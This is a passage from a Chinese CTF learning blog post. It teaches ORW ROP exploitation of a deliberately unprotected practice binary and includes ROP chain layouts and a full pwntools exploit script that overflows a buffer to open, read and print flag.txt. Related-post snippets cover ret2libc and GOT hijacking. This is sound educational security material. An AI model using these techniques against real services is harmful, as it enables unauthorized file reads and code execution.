+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc orw.c -o orw \</span><br><span class="line">    -fno-stack-protector \</span><br><span class="line">    -fno-pie -no-pie \</span><br><span class="line">    -Wl,-z,norelro</span><br></pre></td></tr></table></figure>
+<p>检查保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec ./orw</span><br></pre></td></tr></table></figure>
+<p><img src="/img/mainbackground/orw-rop-01.png" alt="image"><br>这是一个入门环境，关闭 Canary 和 PIE，方便先练习栈溢出与 ROP。NX 可以开启，因为利用不需要执行栈上的新代码。</p>
+<h3 id="确认函数入口和-gadget"><a href="#确认函数入口和-gadget" class="headerlink" title="确认函数入口和 gadget"></a>确认函数入口和 gadget</h3><p>使用 pwntools 查看 PLT：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./orw&#x27;)</span><br><span class="line"></span><br><span class="line">print(f&#x27;open@plt  = &#123;elf.plt[&quot;open&quot;]:#x&#125;&#x27;)</span><br><span class="line">print(f&#x27;read@plt  = &#123;elf.plt[&quot;read&quot;]:#x&#125;&#x27;)</span><br><span class="line">print(f&#x27;write@plt = &#123;elf.plt[&quot;write&quot;]:#x&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+<h2 id="第一阶段：把文件名写入-bss"><a href="#第一阶段：把文件名写入-bss" class="headerlink" title="第一阶段：把文件名写入 .bss"></a>第一阶段：把文件名写入 <code>.bss</code></h2><p>先选择一块可写地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_bss = elf.bss(0x800)</span><br></pre></td></tr></table></figure>
+<p>变量名 <code>flag_bss</code> 表示这块 <code>.bss</code> 内存。可以打印地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(hex(flag_bss))</span><br></pre></td></tr></table></figure>
+<p>接下来构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, flag_bss, 9);</span><br></pre></td></tr></table></figure>
+<p>对应参数是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi = 0</span><br><span class="line">rsi = flag_bss</span><br><span class="line">rdx = 9</span><br></pre></td></tr></table></figure>
+<p>ROP 链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret</span><br><span class="line">0</span><br><span class="line">pop rsi; ret</span><br><span class="line">flag_bss</span><br><span class="line">pop rdx; ret</span><br><span class="line">9</span><br><span class="line">read@plt</span><br><span class="line">main</span><br></pre></td></tr></table></figure>
+<p><code>read()</code> 返回后跳回 <code>main</code>，程序再次调用 <code>vuln()</code>，等待第二阶段的溢出 payload。<br><code>flag.txt</code> 是 8 个字符，加上 <code>\0</code> 正好 9 字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;flag.txt\x00&#x27;</span><br></pre></td></tr></table></figure>
+<p>脚本中的第一阶段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload1 = flat(</span><br><span class="line">    b&#x27;A&#x27; * offset,</span><br><span class="line"></span><br><span class="line">    pop_rdi,</span><br><span class="line">    0,</span><br><span class="line"></span><br><span class="line">    pop_rsi,</span><br><span class="line">    flag_bss,</span><br><span class="line"></span><br><span class="line">    pop_rdx,</span><br><span class="line">    9,</span><br><span class="line"></span><br><span class="line">    read_plt,</span><br><span class="line">    main</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>offset</code> 是从 <code>buf</code> 开始到保存返回地址之间的长度。本题测得为 72；实际使用前要用 cyclic pattern 或 GDB 根据自己的二进制确认。</p>
+<h2 id="第二阶段：open、read、write"><a href="#第二阶段：open、read、write" class="headerlink" title="第二阶段：open、read、write"></a>第二阶段：open、read、write</h2><h3 id="调用-open-flag-bss-0"><a href="#调用-open-flag-bss-0" class="headerlink" title="调用 open(flag_bss, 0)"></a>调用 <code>open(flag_bss, 0)</code></h3><p>参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdi = flag_bss</span><br><span class="line">rsi = 0</span><br></pre></td></tr></table></figure>
+<p>ROP 片段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret</span><br><span class="line">flag_bss</span><br><span class="line">pop rsi; ret</span><br><span class="line">0</span><br><span class="line">open@plt</span><br></pre></td></tr></table></figure>
+<h3 id="传递文件描述符"><a href="#传递文件描述符" class="headerlink" title="传递文件描述符"></a>传递文件描述符</h3><p><code>open()</code> 成功后，文件描述符在 <code>eax</code> 中。需要把它放入 <code>edi</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edi, eax; ret</span><br></pre></td></tr></table></figure>
+<p>对应脚本中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move = 0x40121c</span><br></pre></td></tr></table></figure>
+<p>地址必须反汇编确认确实是这条指令。</p>
+<h3 id="调用-read-fd-flag-bss-0x100"><a href="#调用-read-fd-flag-bss-0x100" class="headerlink" title="调用 read(fd, flag_bss, 0x100)"></a>调用 <code>read(fd, flag_bss, 0x100)</code></h3><p>参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi = open 返回的 fd</span><br><span class="line">rsi = flag_bss</span><br><span class="line">rdx = 0x100</span><br></pre></td></tr></table></figure>
+<p>文件内容会被写到 <code>.bss</code>。路径字符串此前已经被 <code>open()</code> 使用完，因此可以被覆盖。</p>
+<h3 id="调用-write-1-flag-bss-0x100"><a href="#调用-write-1-flag-bss-0x100" class="headerlink" title="调用 write(1, flag_bss, 0x100)"></a>调用 <code>write(1, flag_bss, 0x100)</code></h3><p>参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi = 1</span><br><span class="line">rsi = flag_bss</span><br><span class="line">rdx = 0x100</span><br></pre></td></tr></table></figure>
+<p><code>1</code> 是标准输出。程序会将 <code>.bss</code> 中的数据输出到终端。</p>
+<h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><p>以下脚本按本地测试中使用的 <code>offset = 72</code> 和 gadget 地址展示。不同编译结果要重新核对这些值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./orw&#x27;)</span><br><span class="line">elf = ELF(&#x27;./orw&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 72</span><br><span class="line">flag_bss = elf.bss(0x800)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">read_plt = elf.plt[&#x27;read&#x27;]</span><br><span class="line">open_plt = elf.plt[&#x27;open&#x27;]</span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line"># 以当前编译结果为准，使用前通过反汇编确认</span><br><span class="line">pop_rdi = 0x401201</span><br><span class="line">pop_rsi = 0x40120a</span><br><span class="line">pop_rdx = 0x401213</span><br><span class="line">mov_edi_eax = 0x40121c</span><br><span class="line"></span><br><span class="line">log.info(f&#x27;flag_bss = &#123;flag_bss:#x&#125;&#x27;)</span><br><span class="line">log.info(f&#x27;open@plt = &#123;open_plt:#x&#125;&#x27;)</span><br><span class="line">log.info(f&#x27;read@plt = &#123;read_plt:#x&#125;&#x27;)</span><br><span class="line">log.info(f&#x27;write@plt = &#123;write_plt:#x&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一阶段：将 flag.txt\0 写入 .bss</span><br><span class="line">payload1 = flat(</span><br><span class="line">    b&#x27;A&#x27; * offset,</span><br><span class="line"></span><br><span class="line">    pop_rdi,</span><br><span class="line">    0,</span><br><span class="line"></span><br><span class="line">    pop_rsi,</span><br><span class="line">    flag_bss,</span><br><span class="line"></span><br><span class="line">    pop_rdx,</span><br><span class="line">    9,</span><br><span class="line"></span><br><span class="line">    read_plt,</span><br><span class="line">    main</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;Input:\n&#x27;, payload1)</span><br><span class="line"></span><br><span class="line"># 这 9 字节应由 ROP 链中的 read(0, flag_bss, 9) 接收</span><br><span class="line">io.send(b&#x27;flag.txt\x00&#x27;)</span><br><span class="line"></span><br><span class="line"># 第二阶段：open -&gt; read -&gt; write</span><br><span class="line">payload2 = flat(</span><br><span class="line">    b&#x27;A&#x27; * offset,</span><br><span class="line"></span><br><span class="line">    # open(flag_bss, 0)</span><br><span class="line">    pop_rdi,</span><br><span class="line">    flag_bss,</span><br><span class="line"></span><br><span class="line">    pop_rsi,</span><br><span class="line">    0,</span><br><span class="line"></span><br><span class="line">    open_plt,</span><br><span class="line"></span><br><span class="line">    # edi = eax，也就是 open 返回的 fd</span><br><span class="line">    mov_edi_eax,</span><br><span class="line"></span><br><span class="line">    # read(fd, flag_bss, 0x100)</span><br><span class="line">    pop_rsi,</span><br><span class="line">    flag_bss,</span><br><span class="line"></span><br><span class="line">    pop_rdx,</span><br><span class="line">    0x100,</span><br><span class="line"></span><br><span class="line">    read_plt,</span><br><span class="line"></span><br><span class="line">    # write(1, flag_bss, 0x100)</span><br><span class="line">    pop_rdi,</span><br><span class="line">    1,</span><br><span class="line"></span><br><span class="line">    pop_rsi,</span><br><span class="line">    flag_bss,</span><br><span class="line"></span><br><span class="line">    pop_rdx,</span><br><span class="line">    0x100,</span><br><span class="line"></span><br><span class="line">    write_plt</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;Input:\n&#x27;, payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/mainbackground/orw-rop-02.png" alt="image"><br>得到flag</p>
+<h2 id="ORW-过程中最重要的状态变化"><a href="#ORW-过程中最重要的状态变化" class="headerlink" title="ORW 过程中最重要的状态变化"></a>ORW 过程中最重要的状态变化</h2><p>整条链可以从寄存器和内存的变化来理解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">第一阶段：</span><br><span class="line">read(0, flag_bss, 9)</span><br><span class="line">把 &quot;flag.txt\0&quot; 写入 .bss</span><br><span class="line"></span><br><span class="line">第二阶段：</span><br><span class="line">rdi = flag_bss</span><br><span class="line">rsi = 0</span><br><span class="line">调用 open</span><br><span class="line">返回：rax = fd</span><br><span class="line"></span><br><span class="line">调用 mov edi, eax; ret</span><br><span class="line">结果：rdi = fd</span><br><span class="line"></span><br><span class="line">rsi = flag_bss</span><br><span class="line">rdx = 0x100</span><br><span class="line">调用 read</span><br><span class="line">结果：文件内容写入 .bss，rax = 实际读取字节数</span><br><span class="line"></span><br><span class="line">rdi = 1</span><br><span class="line">rsi = flag_bss</span><br><span class="line">rdx = 0x100</span><br><span class="line">调用 write</span><br><span class="line">结果：终端收到文件内容</span><br></pre></td></tr></table></figure>
+<p>理解这条数据流，比单纯记住 payload 顺序更重要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径地址 → open → 文件描述符 → read → 内存缓冲区 → write → 标准输出</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ORW 的本质是通过 ROP 依次调用文件操作函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">open(path, 0)</span><br><span class="line">        ↓</span><br><span class="line">得到 fd</span><br><span class="line">        ↓</span><br><span class="line">read(fd, buffer, size)</span><br><span class="line">        ↓</span><br><span class="line">数据进入进程内存</span><br><span class="line">        ↓</span><br><span class="line">write(1, buffer, size)</span><br><span class="line">        ↓</span><br><span class="line">数据输出到终端</span><br></pre></td></tr></table></figure>
+<p>本篇实战先通过 <code>read(0, flag_bss, 9)</code> 把 <code>flag.txt\0</code> 写入 <code>.bss</code>，再调用 <code>open()</code>。虽然当前目录已经有 <code>flag.txt</code> 文件，<code>open()</code> 仍然需要进程内存中的路径字符串，因此这一步不能省略。<br>最关键的知识点是</p>
+<ul>
+<li><code>open()</code> 的路径参数是字符串地址；</li>
+<li><code>read()</code> 的内容写入内存缓冲区；</li>
+<li><code>write()</code> 按指定长度输出内存数据；</li>
+<li>amd64 参数分别由 <code>rdi</code>、<code>rsi</code>、<code>rdx</code> 等寄存器传递；</li>
+<li><code>open()</code> 返回的 fd 在 <code>rax</code>，调用 <code>read()</code> 前要传给 <code>rdi</code>；</li>
+<li><code>.bss</code> 可以存放路径字符串和文件内容；</li>
+<li>gadget 地址、函数入口和溢出偏移都要按当前二进制确认。</li>
+</ul>
+<p>别再让等等耗尽你所有的可能。<br>不要把梦想留给未来的某一天，现在就是开始的时刻。</p>
+<p><strong>Don’t let someday steal all your possibilities.</strong><br><strong>Start now, keep moving, and become who you want to be.</strong></p>
+<p>—— yanami</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/ORW/">ORW</a></div><div class="post-share"><div class="social-share" data-image="/img/yanami15.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/10/07/PIE%20%E5%BC%80%E5%90%AF%E4%B8%8B%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%EF%BC%9A%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80%E5%B9%B6%E5%8A%AB%E6%8C%81%20GOT/" title="PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT"><img class="cover" src="/img/yanami14.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT</div></div><div class="info-2"><div class="info-item-1">前面我们已经学会了利用格式化字符串漏洞改写 GOT。本篇在此基础上打开 PIE，完成一次两阶段利用：  第一次输入泄露主程序中的代码地址； 根据泄露值计算本次运行的 PIE 基址； 第二次输入把 exit@got 改成 win()； 程序调用 exit(0) 时跳转到 win()，读取 flag。这篇文章直接围绕题目展开，包含源码、编译命令、调试步骤和完整利用脚本。  题目源码创建 challenge.c： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;static void read_format(char *buf, size_t size) &#123;    if (fgets(buf, size, stdin) == NULL) &#123;        _exit(1);    &#125;...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/09/20/%E5%88%A9%E7%94%A8%20puts%20%E8%BF%9B%E8%A1%8C%20ret2libc/" title="利用 puts 进行 ret2libc"><img class="cover" src="/img/yanami5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-20</div><div class="info-item-2">利用 puts 进行 ret2libc</div></div><div class="info-2"><div class="info-item-1">ret2libc 是什么如果程序中没有 win() 函数，但是程序使用了 libc，那么我们可以利用 libc 中已经存在的函数。例如 1system(&quot;/bin/sh&quot;); system() 并不一定存在于当前程序的代码段中，但它通常存在于程序依赖的 libc 中。ret2libc 的基本思路是 123456789泄露 libc 函数地址        ↓计算 libc 基地址        ↓计算 system 地址        ↓计算 &quot;/bin/sh&quot; 字符串地址        ↓调用 system(&quot;/bin/sh&quot;) 因此，ret2libc 通常分成两个阶段： 12第一阶段：泄露 libc 地址第二阶段：调用 system(&quot;/bin/sh&quot;) 本篇将完整学习 ret2libc 的两个阶段：先泄露 libc 地址，再调用 system(&quot;/bin/sh&quot;)。 为什么要泄露 libc 地址Linux 开启 ASLR 后，libc 每次加载到内存中的地址可能不同。例如某次...</div></div></div></a><a class="pagination-related" href="/2026/09/15/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%8032%E4%BD%8D/" title="栈溢出基础 32 位"><img class="cover" src="/img/laoba3.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-15</div><div class="info-item-2">栈溢出基础 32 位</div></div><div class="info-2"><div class="info-item-1">环境准备样本介绍我们的实验程序：yanami32  下载实验程序 yanami32  源码： 123456789101112#include&lt;stdio.h&gt;void test()&#123;    char buf[16];    gets(buf);    printf(&quot;%s\n&quot;,buf);&#125;int main()&#123;    test();    return 0;&#125; 存在漏洞： 1gets(buf); gets 不限制输入长度。例如 1AAAA 只影响 buf 12buf:AAAA 但是 1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 可能覆盖 123bufsaved ebpreturn address 进入 gdb 调试命令： 1gdb ./yanami32 进入调试环境。 常用指令介绍这里统一解释一次。 1. disassemble1disassemble test 作用：查看函数反汇编。例如： 2. break简写： 1b 作用：设置断点。例如 1b test 表示：程序运行到 test...</div></div></div></a><a class="pagination-related" href="/2026/10/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E6%88%98%EF%BC%9A%E8%A6%86%E7%9B%96%20exit@got%20%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/" title="格式化字符串实战：覆盖 exit@got 劫持程序流程"><img class="cover" src="/img/yanami13.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-06</div><div class="info-item-2">格式化字符串实战：覆盖 exit@got 劫持程序流程</div></div><div class="info-2"><div class="info-item-1">上一篇已经学习了如何使用格式化字符串漏洞，通过 %n 修改 GOT。本篇进行一个更加接近 CTF 的实战题。与前面的练习相比，这道题有几个变化：  不再直接覆盖 puts@got； 程序只有一次输入机会； 程序开启 Canary； 程序使用 Partial RELRO； 目标函数不会被正常调用； 需要覆盖 exit@got，等待程序退出时触发 win； 需要使用 GDB 分析 GOT，而不是只观察栈。最终利用链如下  1234567891011121314151617printf(buf)        ↓确定格式化字符串 offset        ↓找到 exit@got        ↓找到 win 地址        ↓使用 %hn 修改 exit@got        ↓程序执行 exit(0)        ↓exit@plt 从 GOT 取到 win        ↓执行 win()        ↓读取 flag 题目源码1234567891011121314151617181920212223242526272829303132333435#include &l...</div></div></div></a><a class="pagination-related" href="/2026/09/20/canary%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/" title="Canary 学习第三天：利用 printf 格式化字符串泄露 Canary"><img class="cover" src="/img/yanami2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-20</div><div class="info-item-2">Canary 学习第三天：利用 printf 格式化字符串泄露 Canary</div></div><div class="info-2"><div class="info-item-1">今天学习printf泄露canary 正常的 printf正常写法是： 1234char buf[64];read(0, buf, 63);buf[63] = &#x27;\0&#x27;;printf(&quot;%s&quot;, buf); 这里的 12第一个参数：格式字符串 &quot;%s&quot;第二个参数：buf printf 会把 buf 当作普通字符串输出。如果你输入 1hello 输出就是 1hello 这时用户输入的内容只是数据，不会被当成指令。 危险的 printf(buf)如果程序写成 1printf(buf); 那么用户输入本身就变成了格式字符串例如你输入 1hello 程序实际相当于： 1printf(&quot;hello&quot;); 暂时看不出问题。但如果你输入 1%p 程序实际相当于 1printf(&quot;%p&quot;); 问题就出现了 1%p 的意思是：  从参数列表中取出一个指针，并按照十六进制打印。  可是程序实际上没有给 printf 提供第二个参数 1printf(&quot;%p&quot;); 于是 printf ...</div></div></div></a><a class="pagination-related" href="/2026/09/20/Pwn%20%E5%9F%BA%E7%A1%80%EF%BC%9AROP%20%E4%B8%8E%20x86-64%20%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E2%80%94%E2%80%94%E7%90%86%E8%A7%A3%20pop%20rdi%20;%20ret/" title="Pwn 基础：ROP 与 x86-64 函数传参——理解 pop rdi ; ret"><img class="cover" src="/img/yanami4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-20</div><div class="info-item-2">Pwn 基础：ROP 与 x86-64 函数传参——理解 pop rdi ; ret</div></div><div class="info-2"><div class="info-item-1"> 为什么 pop rdi ; ret 能让我们控制函数的第一个参数？  ROP 是什么ROP 全称Return-Oriented Programming中文一般叫返回导向编程它的核心思想不是自己注入一大段新代码而是利用程序里本来就存在的小段指令这些小段指令通常以ret结尾。我们把这种小段指令叫 1gadget 比如 12pop rdiret 就是一个非常经典的 gadget 为什么会有 ROP你前面学栈溢出时，本质上已经做过 1覆盖返回地址 比如 123bufsaved rbpsaved rip 如果我们把 1saved rip 覆盖成 1win() 那就是 ret2text。例如 1payload = b&quot;A&quot; * offset + p64(win) 函数执行 1ret 以后 1RIP = win 于是程序跳到 win()。但是如果程序里没有win()呢？那我们就不能直接找一个现成的完整后门函数。  这时就可以想程序里虽然没有完整后门，但有没有很多“小零件”可以拼起来？  这就是 ROP ret 到底做了什么这一点必须理解。假设现在 1RSP = 0x7ff...</div></div></div></a><a class="pagination-related" href="/2026/09/16/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%9864%E4%BD%8Dret2text/" title="栈溢出实战 64 位 ret2text"><img class="cover" src="/img/OIP.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-16</div><div class="info-item-2">栈溢出实战 64 位 ret2text</div></div><div class="info-2"><div class="info-item-1">很好，32位 ret2text 已经完整走通了，现在进入 64位栈溢出 ret2text。其实64位和32位最大的区别不是“栈溢出原理变了”，而是：  函数调用约定、寄存器、地址长度发生了变化。  所以我们重新梳理一遍，但是重点放在和32位不同的地方。 准备64位环境 附件 pwn64  写一个简单程序： 123456789101112131415161718192021#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void win()&#123;    printf(&quot;You win!\n&quot;);    system(&quot;/bin/sh&quot;);&#125;void test()&#123;    char buf[16];    gets(buf);    printf(&quot;%s\n&quot;,buf);&#125;int main()&#123;    test();    return 0;&#125;  32位和64位最大的区别32位：地址是4字节比如0x08049186paylo...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Anna Yanami</div><div class="author-info-description">Cyber Security Learner
+CTF Player | AI Security Researcher
+</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" href="https://yanami-sec.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="tencent://message/?uin=1334258945" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #12B7F5;"></i></a><a class="social-icon" href="/img/wechat.jpg" target="_blank" title="微信"><i class="fab fa-weixin" style="color: #07C160;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to Yanami Security Lab.
+Cyber Security · CTF · AI · Research
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ORW-%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">ORW 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">普通程序如何读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.</span> <span class="toc-text">文件描述符是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">1.3.</span> <span 